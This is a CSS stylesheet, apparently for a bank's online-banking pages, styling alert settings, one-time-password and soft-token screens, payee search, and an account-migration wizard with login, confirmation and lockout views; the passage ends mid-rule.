.alerts-description-section { padding: 0px 0px 20px 0px; }
.alerts-delivery-options-label { margin-bottom: 16px; }

.exp-collapse.alerts-ui a {padding: 0 10px 10px 30px; font-size:14px;}
.exp-collapse.alerts-ui a:before{margin: -5px 0 0 -15px; position: absolute; left: 33px; }
.alertui-table.table > thead > tr > th {width: 15%; text-align: center; vertical-align: middle; }
.alertui-table.table > thead > tr > th:first-child {width: 70%; text-align: left; vertical-align: middle; }
.alertui-table.table .icon-envelope{font-size:15px; padding: 0;}
.alertui-table.table .icon-mobile-phone {font-size:25px !important ; padding: 0;}
.alertui-table.table > tbody > tr > td{vertical-align: middle; width: 15%; padding: 8px; white-space: normal;}
.alertui-table.table > tbody > tr > td:first-child{width: 70%;}
.alertui-table.table > tbody > tr > td:last-child{white-space: normal !important;}
.alertui-table.table > tbody > tr > td ul{margin-top: 8px;}
.alertui-table.table > tbody > tr > td li{margin-bottom: 5px;}
.alertui-table.table > tbody > tr > td.security-error-msg {padding: 0; border: 0; text-align:center;}
.alertui-table.table > tbody > tr > td.security-error-msg .error-msg {margin: 0 0 8px 0!important;}
.alertui-table.table > tbody > tr > td.accnt-act-details{padding: 20px;}
.alertui-table .alert-details td {background: #fbfbfb; }
.alert-details .alerts-expandedv-label{margin-top:6px;}
.alert-details .RUIFW-prepend > span {left: 3px;}
.alertui-table .radio label,.alertui-table .checkbox label {font-size: 12px;}
.alerts-details-fieldset { margin: 0 0 0 -15px; }
.alerts-threshold-amount-input { margin-left: -6px; }
.alerts-deliverable-accounts-list > tbody > tr > td { padding-bottom: 10px; }

.alerts-internal-container{max-height: 400px; overflow-x: hidden; overflow-y: auto; padding-bottom: 25px; }
.alerts-internal-container .exp-collapse a {display: block; padding-right: 15px; position: relative; }
.alerts-internal-container .exp-collapse a:after{content:" "; clear: both; display: table;}
.alerts-internal-container .exp-collapse a div.section-label {float: left; width: 69%; text-align: left;}
.alerts-internal-container .exp-collapse a div {float: right; width: 15.5%; text-align: center;}
.alerts-internal-container .RUIFW-inline label{white-space: normal !important;}
.freq-view-addtn-ip{padding-left: 73px;}

.floating-button-container{position:relative; margin: 20px -25px -25px -25px; }
.floating-button-container .note {position: relative;  z-index: 3;  margin: 0 auto -36px;   padding: 0 200px 0 50px; }
.floating-button-container .note img{position: absolute;    margin: -1px 0 0 -25px;}
.floating-button-container .buttons {position: absolute; z-index:3; margin-top:-25px; right:25px;}
.floating-button-container .buttons .btn {margin: 0 0 0 10px; min-width: 80px;}
.floating-button-container .buttons-bg{background: #f1f1f1; opacity: 0.9; width:100%; height: 50px;  z-index:2;}

.data-not-available {padding:15px; border: 1px solid #ddd;}
.data-not-available .empty-msg {font-weight: bold; margin-bottom: 5px;}
.data-not-available .empty-msg a {font-weight: normal;}

.disable-section, .disable-section input,.disable-section select{ pointer-events: none; opacity: 0.4; }

.wizard-form-content-for-web { padding: 15px 25px 25px 25px; background: #F1F1F1; }
.alerts-button-align {margin-top:25px;}

.alerthistory-table tr td:last-child{white-space: normal !important;}
.alerthistory-table{ margin-top: 15px;}
.alerthistory-table thead tr th,.alerthistory-table tbody tr td {padding:8px;}
.alerthistory-table tfoot tr td {padding:15px 8px 8px; background: #fff; border: none; }
.alerthistory-table td:first-child {white-space:nowrap !important;}
 #openpopupwindow {display:inline;}
.alerts_invalid_mobile_number{color:#d81e05;margin:0 0 5px 0;}
.alerts_invalid_mobile_number1{float:left;padding-left: 3px;}
.alerts_sg_text{font-weight: bold;color: #606060;font-size: 1.3rem;font-size: 13px;float: left;}
.alerts-sg-setup-mobile-number-description { margin-top: 5px; }
.alerts-sg-setup-form-content-margin-top { margin-top: 18px; }
.alerts-sg-setup-wizard-box-border-top { border-top: 1px solid #e0e0e0; }

.alerts-sg-setup-error-msg .error-msg { margin-left: 0px !important }
.txt-center_imp{text-align: center!important;}
.alerts_security_checkbox_alignment{text-align: center;padding: 0px 0px 0px 7px;}
.alerts_security_dropdown_alignment{padding: 0px 13px 0px 9px;}
.wrap-text{word-wrap: break-word;}

.wrap-text{word-wrap: break-word;}
.tptpanel{background: #E8E8E8;border: 1px solid #E4E4E4;border-radius: 4px;}
.tptinfoicon{position: absolute;margin: 15px 0 0 30px;}
.tptmsgcontainer{padding: 15px 15px 15px 60px;}


.whitebackground_message_frame{background: #FFFFFF;border-radius: 8px;border-radius: 8px; padding-top: 20px; padding-left: 20px; padding-right: 20px;}
.alert-icon-error-enrollment { background: url(../images/error-message.png) left center no-repeat; float:left;  width: 30px; height: 33px; margin-right: 20px!important;}
.otpErrorText { font-size: 16px;  color: #606060; letter-spacing: -0.15px; line-height: 20px; padding-top: 6px; padding-bottom: 25px;}
.otpText { font-size: 16px; color: #606060; padding-left: 10px; padding-top: 4px;}
.icon-lock-out-enrollment { background: url(../images/icon-lokcout-error.svg) left center no-repeat; float:left;  width: 57px; height: 69px; margin-right: 20px!important; margin-top: 20px;  margin-bottom: 20px;  margin-left: 20px}
.otpLockOutText { font-size: 20px;  color: #000000; letter-spacing: 0px; padding-top: 36px; padding-bottom: 36px;}
.icon-mail-missing-enrollment { background: url(../images/icon-warning.svg) left center no-repeat; float:left;  width: 60px; height: 60px; margin-right: 20px!important; margin-top: 20px;  margin-bottom: 20px;  margin-left: 20px}
.otpWarningText { font-size: 24px; color: #000000; letter-spacing: 0; padding-top: 20px; padding-bottom: 5px;  }
.otpWarningText2 { font-size: 16px; color: #333333; letter-spacing: 0;line-height: 25px; padding-right: 15px; padding-bottom: 20px; padding-left: 111px;}
.otpWelcomeHeader{font-size: 24px;  color: #333333; letter-spacing: 0px; line-height: 25px;}
.otpWelcomeDesc{font-size: 16px;  color: #333333; letter-spacing: 0px; line-height: 25px;}

.form-control::-webkit-input-placeholder { color: #BFBFBF; }
.form-control::-moz-placeholder { color: #BFBFBF; }
.form-control::-ms-input-placeholder { color: #BFBFBF; }
.form-control::-moz-placeholder { color: #BFBFBF; }

.leap-radio-wrapper { display: block; position: relative; padding-left: 35px; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; margin-top: 15px; margin-bottom: 18px}
.leap-radio-act { position: absolute; opacity: 0; cursor: pointer; }
p.leap-radio { position: absolute; top: 0; left: 0; height: 24px; width: 24px; background-color: white; border-radius: 50%; border: 1px solid #757575; margin-top: 0px!important; margin-bottom: 0px!important; margin-right:  0px!important; margin-left:  0px!important;}
p.leap-radio2 { position: absolute; top: 0; left: 0; height: 24px; width: 24px; background-color: white; border-radius: 50%; border: 1px solid #757575; margin-top: 0px!important; margin-bottom: 0px!important; margin-right:  0px!important; margin-left:  0px!important;}
label.leap-radio-label{ max-width: fit-content!important; font-weight: normal !important; margin:0px; cursor: pointer;margin-top: 2px}
.leap-radio-act:checked~.leap-radio-label>.leap-radio {  background-color: #606060;  border: 1px solid #606060;}
.leap-radio-act:disabled~.leap-radio-label>.leap-radio { background-color: #c5c5c5; border: 1px solid #c5c5c5;}
.leap-radio-act:checked~.leap-radio-label>.leap-radio2 {  background-color: #606060;  border: 1px solid #606060;}
.leap-radio-act:disabled~.leap-radio-label>.leap-radio2 { background-color: #c5c5c5; border: 1px solid #c5c5c5;}
.leap-radio-act:disabled~.leap-radio-label { opacity: 0.75 }
.leap-radio:after { content: ""; position: absolute; display: none; }
.leap-radio2:after { content: ""; position: absolute; display: none; }
.leap-radio-act:checked~.leap-radio-label>.leap-radio:after { display: block; }
.leap-radio-act:checked~.leap-radio-label>.leap-radio2:after { display: block; }
.leap-radio-wrapper .leap-radio:after { top: 7px; left: 7px; width: 8px; height: 8px; border-radius: 50%; background: #ffffff; }
.leap-radio-wrapper .leap-radio2:after { top: 7px; left: 7px; width: 8px; height: 8px; border-radius: 50%; background: #ffffff; }
.loadMoreResultLink { color: #0000FF; margin-top: 25px; margin-left: 35px; }
.searchBox { background: url(../images/payee/search.svg) no-repeat; background-position: left; background-position-x: 5px; background-color: #FFF; padding-left: 26px; }
.borderNewPayeeName{ margin-right: -25px; margin-top: -25px; background: #DFDFDF; margin-left: -25px; }
.payeeMargin{ padding: 20px 0; margin-left: 40px; }
.payeeContent{ padding-top: 10px; }
.payeeLabels { font-size: 20px; font-weight: normal;}
.SearchNoMatch {font-weight: normal; margin-top: 15px; display:block;}

.alcbx-alcrb {position: relative;width: 20px;height: 20px;border: 1px solid #606060;border-radius: 4px;vertical-align: middle;cursor: pointer;background:white;}
.alcheckbox-wrapper{display:table-row}
.alcbx-alcrb.has-error {border: 1px solid #d81e05 !important;}
.alcbx-alcrb1{visibility: hidden;width: 0 !important;height: 0 !important;display: none;}
.alcbx-alcrb-wrapper {display: table-cell;}
.alcbx1{width:0!important;height:0!important;display:none}
.alcbx{position: relative;top: 1px;width: 20px;height: 20px;border: 1px solid #c5c5c5;border-radius: 3px;background: #fff;}
.alcbx-alcrb:after{content:'';position:absolute;top:3px;left:5px;width:6px;height:10px;opacity:0;transform:rotate(45deg) scale(0);border-right:2px solid #fff;border-bottom:2px solid #fff;}
.alcbx-alcrb1:checked~.alcbx-alcrb:after{opacity:1;transform:rotate(45deg) scale(1);}
.alcbx-alcrb1:checked~.alcbx-alcrb{background-color:#606060;border-color:#606060;}
.alcbx-alcrb1:disabled~.alcbx-alcrb{background-color:#ffffff; border-color:#c5c5c5;position:initial;}

.stTooltipMargin{margin-top: 0px !important;}

.push-icon-warning-signon { background: url(../images/warning_message.png) left center no-repeat; float:left;  width: 30px; height: 33px; margin-right: 20px!important;}
.push-icon-successs-signon { background: url(../images/success-message.png) left center no-repeat; float:left;  width: 30px; height: 33px; margin-right: 20px!important;}
.push-icon-spinner-signon { background: url(../images/spinner.gif) right center no-repeat; float:right;  width: 39px; height: 36px; margin-top:-2px; margin-left: 20px!important;}
.pushotpwizard-box { border-right: 1px solid #e0e0e0; border-left: 1px solid #e0e0e0; border-bottom: 1px solid #e0e0e0; border-top: 1px solid #e0e0e0; }
.pushotpwizard-form-content { padding: 25px; padding-top:10px; padding-bottom:10px; background: #F1F1F1; }
.pushotpbtn-holder { margin-top: 15px;}


.changepassword-otp-welcome-desc{font-size: 14px;  color: #606060; letter-spacing: 0px; line-height: 16px;}
.changepassword-wizard-form-content-main { padding: 25px; background: #E0E0E0; }
.changepassword-wizard-form-content-sub { padding: 25px; background: #EFEFEF; }
.icon-intercept-soft-token { background: url(../images/intercept-softToken-es-PA.png) left center no-repeat; float:left;  width: 57px; height: 69px; margin-right: 20px!important; margin-top: 20px;  margin-bottom: 20px;  margin-left: 20px}
.intercept-holder{margin-right: 20px!important; margin-top: 20px;  margin-bottom: 20px;  margin-left: 20px;}
.softTokenLockOutText{font-size: 15px;  color: #000000; letter-spacing: 0px; padding-top: 100px; margin-left: 22px;}
.softTokenLockOutErrorCode{font-size: 15px;  color: #808080; letter-spacing: 0px; padding-left: 22px; padding-bottom: 36px;}
.icon-lock-out-soft-token{background: url(../images/icon-soft-token-lock.png) left center no-repeat; float:left;  width: 75px; height: 60px; margin-right: 20px!important; margin-top: 20px;  margin-bottom: 20px;  margin-left: 20px}
.softtokenapplink,softtokenapplink:hover,softtokenapplink:active{border: 1px solid #ED0722 !important;border-radius: 8px;border-radius: 8px;text-align: center;background: #FFFF;font-size: 16px;width: 42%;color: #ED0722 !important;padding:9px;cursor:pointer;}
.spacebetweensofttokenlink{padding-left: 10px !important;}


.updatebnstxt{font-weight: bold;font-size: 20px;color: #000000;letter-spacing: -0.19px;line-height: 24px;}
.updatebnscontinuetxt{font-family: Arial;font-size: 15px;color: #606060;letter-spacing: -0.14px;line-height: 22px;}
.bnsiphonestorelink,bnsiphonestorelink:hover,bnsiphonestorelink:active {border: 1px solid #ED0722 !important;border-radius: 8px;border-radius: 8px;text-align: center;background: #FFFF;font-size: 16px;color: #ED0722 !important;padding:16px;cursor:pointer;width:272px;margin: 0 12px;}
.updatebnscontinueLink{font-family: Arial;font-size: 16px;color: #009DD6;letter-spacing: -0.15px;text-align: center;line-height: 22px}
.notestyletxt {font-family: Arial ; font-size: 18px;color: #D81E05 !important;letter-spacing: -0.11px;padding-top:25px}
.modalnote {border-radius: 6px;width:620px;height: 190px;margin-top: 65px;margin-left: 202px;margin-right: 202px;}
#mobileWebConfirmWindow.modal-dialog{width:620px !important; padding-left:202px;padding-right:202px;padding-top:65px}
#mobileWebConfirmWindow..modal-header{border-bottom : none}
.closebtn {margin-top: 10.9px !important; margin-right: 10.7px !important; width: 13.6px; height: 13.6px; color: #333333;}
.updatebnscontinue{font-family: Arial;font-size: 15px;color: #606060;letter-spacing: -0.14px;line-height: 22px;}
.updatebnscontinueBtn{font-family: Arial;font-size: 16px;color: #009DD6;letter-spacing: -0.15px;text-align: center;line-height: 22px;padding-left:52px}
.noteContinueText{font-family: Arial;font-size: 14px;color: #606060;letter-spacing: -0.13px;line-height: 20px}
.learnMoreLinkStyle{font-family: Arial;font-size: 16px;color: #009DD6;letter-spacing: -0.15px;text-align: center;line-height: 22px}
.modalyesbtn {width:80px;height:34px;}

.hrt-wizard-form-content-main { padding: 25px; background: #E0E0E0; }
.hrt-wizard-form-content-sub { padding: 20px; background: #EFEFEF; }
.hrt-title-text { font-family: Helvetica; font-size: 14px; color: #606060; padding-bottom: 15px!important;font-weight: normal;}
.hrt-addPayee-SearchBox { background: url(../images/payee/search.svg) no-repeat; background-position: left; background-position-x: 5px; background-color: #FFF; padding-left: 26px;  font-size: 13px; color: #B0B0B0; text-align: left; }
.hrt-payeeLabels { font-size: 16px; color: #606060; letter-spacing: -0.15px; line-height: 20px; font-weight: normal;}
.hrt-content-divider { padding: 8px; background: #E0E0E0; }
.hrt-button-block-background { background: #E0E0E0; padding-top: 20px; margin-right: -25px; margin-left: -25px; margin-top: 20px; margin-bottom: -25px;}
.cifupdate-wizard-form-content-main {background: #E0E0E0; padding: 25px; }
.cif-notes-panel {background: #FFFFFF; border-radius: 4px; padding: 10px;}
.cif-notes-line {font-size: 12px; color: #606060; letter-spacing: 0.25px; line-height: 18px; padding-top: 5px;}
.cif-notes-span { margin: 0 10px; float: left; }
.cif-update-child-wizard {background: #EFEFEF; margin-top: 20px; padding: 20px;}
.cif-update-form-title {  padding-left: 20px;  padding-right: 20px;   padding-top: 25px;    padding-bottom: 20px;}
.cif-edit-icon {
    background-color: #FFF; background: url(../images/edit-icon.svg) left top no-repeat;  width: 20px;  height: 20px;  display: block;
}
.hrt-element-bottom-position { padding-bottom: 5px;}
.hrt-margin-left{margin-left:25px;}
.hrt-rec-wizard-form-content-sub { padding: 25px; background: #EFEFEF; }
.error-msg-below-width_100 { color: #D81E05; nowhitespace: afterproperty; display: inline-block!important; margin: 0 0 0 0!important; text-align: left!important; word-wrap: break-word!important; /* Internet Explorer 5.5+ */ white-space: pre-wrap!important; width: 100%!important; }


.content-area-bg {  background-color: #e0e0e0;padding: 24px 24px 30px 24px;  }
.info-bg {  border-radius: 4px;  background-color: #ffffff;}
.info-bar {  width: 22px;  height: 22px;  object-fit: contain; }
.starting-today-you {  font-family: Arial;  font-size: 12px;  font-weight: normal;  font-style: normal;  font-stretch: normal;  line-height: 1.5;  letter-spacing: 0.25px;  color: #606060; padding: 12px 12px 12px 46px;}
.line {  padding-bottom: 25px;  border-bottom: solid 1px #e0e0e0;}
.banco-dominicano-del {  width: 282px;  height: 44px;  font-family: Arial;  font-size: 18px;  font-weight: normal;  font-style: normal;  font-stretch: normal;  line-height: 1.22;  letter-spacing: normal;  color: #333333; }
.rectangle-7 {  width: 240px;  height: 32px;  border-radius: 4px;  border: solid 1px #00a6e4;  background-color: #00a6e4; }
.rectangle-7:hover{background-color:#16B2EC !important; color:#FFF !important;}
.moving-your-account {  width: 282px;  height: 17px;  font-family: Arial;  font-size: 16px;  font-weight: normal;  font-style: normal;  font-stretch: normal;  line-height: normal;  letter-spacing: normal;  color: #606060; }
.start-account-migrat {  width: 240px;  height: 16px;  font-family: Arial;  font-size: 14px;  font-weight: bold;  font-style: normal;  font-stretch: normal;  line-height: normal;  letter-spacing: normal;  text-align: center;  color: #ffffff;padding-top: 8px}
.start-account-migrat:hover{color:#FFF !important;}
.btn-save-in { text-align: center; margin: 30px 0 0; }
.new-to-scotia-onLine {  width: 164px;  height: 22px;  font-family: Arial;  font-size: 16px;  font-weight: normal;  font-style: normal;  font-stretch: normal;  line-height: 1.38;  letter-spacing: normal;  color: #333333;}
.enroll-now {  width: 78px;  height: 17px;  font-family: Arial;  font-size: 16px;  font-weight: normal;  font-style: normal;  font-stretch: normal;  line-height: normal;  letter-spacing: normal;  color: #2a5db0;}
.scotiacard-number-username {  width: 228px;  height: 15px;  font-family: Arial;  font-size: 13px;  font-weight: bold;  font-style: normal;  font-stretch: normal;  line-height: normal;  letter-spacing: normal;  color: #606060;}
.important-not-advis {  width: 270px;  height: 19px;  font-family: Arial;  font-size: 12px;  font-weight: bold;  font-style: normal;  font-stretch: normal;  line-height: 1.58;  letter-spacing: normal;  color: #606060;}
.icon-position{position: absolute;margin: 10px 0 0 10px;}

/*****BDP migration changes******/
.bdpIdentification-card-1-bg {background-color: #f5f5f5; padding: 20px 20px 24px 20px;}
.bdp-icon-position{position: absolute;margin: 12px 0 0 16px;}
.bdpIdentification-Provide-your {font-family: Arial;font-size: 16px;font-weight: normal;font-style: normal;font-stretch: normal;line-height: 1.25;letter-spacing: normal;color: #000000;}
.bdpIdentification-To-get-started { font-family: Arial; font-size: 13px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.38; letter-spacing: normal; color: #606060; }
.bdpIdentification-Username { width: 382px; height: 18px; font-family: Arial; font-size: 13px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.38; letter-spacing: normal; color: #000000; }
.bdpIdentification-input-text {outline:none; border:none; width:100%; height: 18px; font-family: Arial; font-size: 13px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.38; letter-spacing: normal; color: #606060; }
.bdpIdentification-input-box { width: 282px; height: 32px; border-radius: 4px; border: solid 1px #cccccc; background-color: #ffffff; }
.bdpIdentification-input-box.red{border: solid 1px #d81e05;}
.bdp-button-enabled { 
	margin-left: 5px;
	width: 90px;
  height: 32px;
  border-radius: 4px;
  border: solid 1px #979797;
  background-color: #606060; }
.bdp-button-font { font-family: Arial; font-size: 14px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: normal; letter-spacing: normal; text-align: center; color: #ffffff; }
.bdp-button-disabled {width: 90px; height: 32px; border-radius: 4px;
	 border: solid 1px #c5c5c5; background-color: #c5c5c5; float: right; margin-left: 8px;}
.bdp-pwd-text {
  width:100%;
  padding-top: 0px;
  padding-bottom: 2px;
  border: none;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  -moz-border-radius: 4px;
  -ms-border-radius: 4px;
  -o-border-radius: 4px;
  background-color: ;
  font-size:13px;
  -ms-box-sizing:content-box;
  -moz-box-sizing:content-box;
  -webkit-box-sizing:content-box; 
  box-sizing:content-box;
  letter-spacing: normal; 
  color: #606060;
  outline: none;
  font-family: Arial; font-size: 13px; font-weight: normal; font-style: normal; font-stretch: normal;
  border: solid 1px #cccccc; background-color: #ffffff;
  float: left;
  height: 18px;
  line-height: 1.38;
}

.bdp-pwd-text.red {
    border: solid 1px #d81e05!important;
}

.bdp-pwd-text-width {
	width:256px !important;
}

.bdp-pwd-box {
  position: relative;
  width: 270px;
  height: 36px;
  border-radius: 4px;
 }
 
 .bdp-pwd-box1 {
  position: relative;
  width: 270px;
  border-radius: 4px;
 }

.bdp-pwd-box.red {
	border: solid 1px #d81e05;
}

.bdp-pwd-box1.red {
	border: solid 1px #d81e05;
}

.bdp-pwd-red{
	border: solid 1px #d81e05;
}

.bdp-eye-show
{
    width: 18px;
    height: 18px;
    background: url(../images/eye_show18-px.png) no-repeat;
    content: ' ';
    position: absolute;
    right: 0;
    top: 9px;
    cursor: pointer;
    display:block;
}

.bdp-eye-right {
	right: 10px !important;
	top: 7px !important;
}
.bdp-eye-hide
{
    width: 18px;
    height: 18px;
    background: url(../images/eye_hidden18-px.png) no-repeat;
    content: ' ';
    position: absolute;
    right: 0;
    top: 9px;
    cursor: pointer;
    display:none;
}

.bdpIdentification-buttons{
    padding-top: 30px;
    padding-bottom: 30px;
}

.bdp-button-red {
  width: 90px;
  height: 32px;
  border-radius: 4px;
  border: solid 1px #bd0000;
  background-color: #d81e05;
  margin-left: 8px;
  cursor: pointer;
  float: right;
}

.bdp-cancel-btn{
	 float: right;
	 white-space: nowrap;
}

.bdp-next-btn{
	padding-top:7px;
	white-space: nowrap;
}

a.linkstyle:hover, a.linkstyle:focus{
	color:#ffffff;
}

a.linkstyle-gray:hover, a.linkstyle-gray:focus{
	color:#606060;
}

/*BDP Authentication*/
.bdp-auth-bg-in {
  width: 650px;
  background-color: #f5f5f5;
  padding-bottom: 20px;
}

.bdp-auth-Enter-veri{
  font-family: Arial;
  font-size: 16px;
  font-weight: normal;
  font-style: normal;
  font-stretch: normal;
  line-height: 1.25;
  letter-spacing: normal;
  color: #000000;
}

.bdp-auth-if-the{
	padding-top:20px;
}

.bdp-auth-Please {
  font-family: Arial;
  font-size: 13px;
  font-weight: normal;
  font-style: normal;
  font-stretch: normal;
  line-height: 1.38;
  letter-spacing: normal;
  color: #606060;
}
.bdp-auth-Please.bold-text {
  font-weight: bold;
}

.bdp-auth-input-code-text {outline:none; border:none; width:100%; height: 18px; 
font-family: Arial; font-size: 13px; font-weight: normal; font-style: normal; font-stretch: normal; 
line-height: 1.38; letter-spacing: normal; color: #333333;position: center; }
.bdp-auth-input-code-box { width: 200px; height: 32px; border-radius: 4px; border: solid 1px #cccccc; background-color: #ffffff;}

.bdp-auth-did-text {
  width: 150px;
  height: 20px;
  font-family: Arial;
  font-size: 16px;
  font-weight: normal;
  font-style: normal;
  font-stretch: normal;
  line-height: 1.25;
  letter-spacing: -0.15px;
  color: #606060;
}
.bdp-auth-did-text.blue-text-link {
  color: #2a5db0;
}
.bdp-auth-did-div{
	float:left;
	white-space: nowrap;
	padding-left: 208px;
    margin-top: 7px;
}
input[type=text].bdp-auth::placeholder, input[type=text].bdp-auth-ms-input-placeholder, input[type=text].bdp-auth::-webkit-input-placeholder {
	outline:none; border:none; width:100%;
	font-family: Arial;
  font-size: 13px;
  font-weight: normal;
  font-style: normal;
  font-stretch: normal;
  line-height: 1.38;
  letter-spacing: 2px;
  color: #bfbfbf;
}

.bdp-combined-shape {
  width: 652px;
  height: 169px;
  box-shadow: 0 2px 10px 0 rgba(0, 40, 80, 0.07);
  background-color: #ffffff;
}

.bdp-content-area-bg-no-email {
  width: 700px;
  height: 281px;
  background-color: #e0e0e0;
  margin-left: -16px;
}

.bdp-existCustText { 
	font-size: 20px; 
	color: #000000; 
	letter-spacing: 0; 
	padding-top: 20px; 
	padding-bottom: 5px;  
	padding-left: 103px;
}

.icon-announcement { 
	background: url(../images/icon-announcement.png) left center no-repeat; 
	float:left;  
	width: 70px; 
	height: 63px; 
	margin-right: 20px!important; 
	margin-top: 20px;  
	margin-bottom: 20px;  
	margin-left: 20px;
}

.bdp-button-Signin {
    width: 96px !important;
    margin-left: 557px !important;   
}

/*BDP username */
.bdp-user-info-bg {
  height: 46px;
  border-radius: 4px;
  background-color: #ffffff;
}

.bdp-user-inner {
  background-color: #f5f5f5;
  padding: 24px;
}

.bdp-user-please-note {
  height: 18px;
  font-family: Arial;
  font-size: 12px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.5;
  letter-spacing: 0.25px;
  color: #606060;
}

.bdp-user-please-note.bold-text{font-weight: bold;}

.bdp-user-please-note-div{
	padding-top:14px;
	padding-left:35px;
}

.bdp-circle {
  -moz-border-radius: 50px/50px;
  -webkit-border-radius: 50px 50px;
  border-radius: 50px/50px;
  border: solid 1.5px #606060;
  width: 20px;
  height: 20px;  
  position: absolute;
}
.bdp-circle.green{
	border: solid 1.5px #138468;
}
.bdp-circle.red{
	border: solid 1.5px #d81e05;
}

.bdp-checkmark-green{
  content: " ";
  display: block;
  width: 0.4em; 
  height: 0.8em;
  border: solid #138468;
  border-width: 0 0.1em 0.1em 0; 
  position: relative;
  left: 0.5em;
  top: 0.5em;
  margin-top: -0.2em;
  -webkit-transform: rotate(45deg); 
  -moz-transform: rotate(45deg);
  -o-transform: rotate(45deg);
  transform: rotate(45deg);
}

.bdp-crossmark-red{
  padding-left: 0.35em;
  font-size:10px;
  color: #d81e05;
}

.bdp-username-error-msg{
	color: #D81E05; 
	margin: 5px 0 0 2px!important; 
	text-align: left!important 
}

.bdp-username-guide-text {
  width: 134px;
  height: 16px;
  font-family: Arial;
  font-size: 13.5px;
  font-weight: normal;
  font-style: normal;
  font-stretch: normal;
  line-height: normal;
  letter-spacing: 0.29px;
  color: #606060;
}

.bdp-disp-user-outer {
  width: 696px;
  height: 292px;
  background-color: #e0e0e0;
  padding: 24px;
}

.bdp-disp-user-inner {
  width: 650px;
  height: 180px;
  background-color: #f5f5f5;
  padding: 24px;
}

.bdp-display-username {
  width: 256px;
  height: 18px;
  font-family: Arial;
  font-size: 13px;
  font-weight: bold;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.38;
  letter-spacing: normal;
  color: #000000;
}

/* BDP pwd */
.bdp-pwd-inner1 {
    padding: 20px 20px 24px 20px;
    background-color: #f5f5f5;
}

/* BDP confirm */
.bdp-confirm-content-area-bg {  background-color: #e0e0e0;padding: 24px 24px 30px 24px;  }

.bdp-confirm-final-step {
  font-family: Arial;
  font-size: 13px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.38;
  letter-spacing: normal;
  color: #606060;
  padding: 24px 24px 0px 24px;
}

.bdp-confirm-card-1-bg {
  	height: 480px;
  	background-color: #f5f5f5;
}

.bdp-confirm-card-2-bg {
  	height: 70px;
  	background-color: #f5f5f5;
  	margin-top: 16px;
}

.bdp-confirm-rectangle {  
	height: 326px;  
	border: solid 1px #e5e5e5;  
	background-color: #ffffff; 
	padding-left: 24px;
	margin: 24px 24px 16px 24px;
}

.bdp-confirm-print {
  height: 16px;
  font-family: Arial;
  font-size: 14px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  text-align: center;
  color: #ffffff;
}

.bdp-confirm-rectangle-7 {
  width: 80px;
  height: 30px;
  border-radius: 4px;
  background-color: #606060;
  float: right;
  margin:0px 24px 0px 0px;
}

.bdp-confirm-agree {
  width: 380px;
  height: 22px;
  font-family: Arial;
  font-size: 13px;
  font-weight: bold;
  font-stretch: normal;
  font-style: normal;
  line-height: 2;
  letter-spacing: normal;
  color: #606060;
  vertical-align: middle;
}

.bdp-confirm-tandcHolder { 
	height: 323px; 
	background: #fff; 
	overflow: auto;
	padding-top: 24px;
}

.content-area-bg-success {
  width: 700px;
  height: 413px;
  background-color: #e0e0e0;
  padding: 24px 24px 30px 24px;
}

.combined-shape-success {
  width: 652px;
  height: 300px;
  box-shadow: 0 2px 10px 0 rgba(0, 40, 80, 0.07);
  background-color: #ffffff;
  
}

.congrats-welcome {
  width: 40px;
  height: 40px;
  object-fit: contain;
}

.congrats_icon {
  width: 38px;
  height: 38px;
}

.welcome-msg {
  width: 548px;
  height: 30px;
  font-family: Arial;
  font-size: 24px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #333333;
  padding-top: 19px;
  padding-left: 64px;
}

.migration-successfull2 {
  width: 575px;
  height: 48px;
  font-family: Arial;
  font-size: 18px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.33;
  letter-spacing: normal;
  color: #333333;
  padding-left: 78px;
  padding-top: 40px;
}

.migration-successfull3 {
  width: 575px;      
  height: 54px;
  font-family: Arial;
  font-size: 14px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.29;
  letter-spacing: -0.18px;
  color: #606060;
  padding-left: 78px;
  padding-top: 55px;
}

.migration-successfull4 {
  width: 575px;
  height: 36px;
  font-family: Arial;
  font-size: 14px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.29;
  letter-spacing: -0.18px;
  color: #606060;
  padding-left: 78px;
  padding-top: 64px;
}

.migarionSuccess-signin {
  width: 80px;
  height: 16px;
  font-family: Arial;
  font-size: 14px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  text-align: center;
  color: #ffffff;
  margin-left: 21px !important;
  margin-top: 6px !important
}	
	
.migarionSuccess-rectangle {	
  width: 120px;
  height: 32px;
  border-radius: 4px;
  border: solid 1px #bd0000;
  background-color: #d81e05;
  margin-left: 270px;
}

.bdp-sorry-we-couldnt {
  width: 615px;
  height: 44px;
  font-family: Arial;
  font-size: 20px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.1;
  letter-spacing: normal;
  color: #000000;
  padding-top: 37px;
}

.bdp-lockout-combined-shape {
  width: 652px;
  height: 117px;
  box-shadow: 0 2px 10px 0 rgba(0, 40, 80, 0.07);
  background-color: #ffffff;
}

.bdp-lockout-content-area-bg {  
	width: 700px;  
	height: 229px;  
	background-color: #e0e0e0;
	padding-top: 24px; 
	padding-left: 24px;
}

.bdp-lockout-modal-footer { 
	padding: 30px 20px 25px; 
	margin-top: 5px; 
	text-align: right; 
	border-top: none; 
}

.bdp-lockout-model-button {
	background-color: #D81E05;
    border-color: #D81E05;
    filter: none !important;
    vertical-align: top!important;
    width: 80px;
    height: 32px;
}

.bdp-has-error { border: 1px solid #D81E05!important; }
.bdp-remove-highlight {box-shadow: none!important;-webkit-box-shadow: none!important;border: none!important;}
.bdp-auth-error-msg { 
	color: #D81E05; 
	nowhitespace: afterproperty; 
	display: inline-block!important; 
	margin: 5px 0 0 17px!important;
	text-align: left!important; 
	word-wrap: break-word!important; 
